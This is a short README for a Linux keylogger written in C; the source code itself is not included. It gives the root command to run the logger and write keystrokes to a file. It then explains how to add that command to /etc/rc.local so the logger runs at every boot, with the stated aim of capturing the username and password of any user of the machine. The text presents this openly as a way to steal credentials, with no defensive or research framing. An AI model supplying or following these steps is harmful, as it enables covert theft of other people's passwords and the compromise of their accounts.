# Description
This is a simple linux keylogger written in C. To run it, execute the
following command:
```
sudo ./keylogger output_file
```
Here, the output file is the one that will store all the keystrokes.

# Notes
- Remmember to run it us root
- Check the header file to see if you need to change the path to keyboard
  device

# Extras
On Ubuntu, you can append the following line:
```
sudo /paht/to/keylogger /path/to/output_file
```
in the /etc/rc.local file, in order to execute the keylogger at system startup.
This way, you will be able to log the username and password of any user of the
computer.
